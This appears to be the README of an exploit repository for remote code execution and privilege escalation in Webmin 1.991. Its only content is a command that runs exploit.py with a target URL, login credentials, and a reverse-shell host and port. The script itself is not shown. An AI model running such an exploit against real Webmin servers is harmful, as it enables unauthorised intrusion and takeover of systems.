# rce_webmin
RCE and privilege escalation webmin version 1.991


# poc:

```bash
/usr/bin/env /bin/python ./exploit.py -u 'https://localhost:10000' -un 'safeusername' -pw 'safeuserpassword' -rh 'localhost' -rp 4445
```
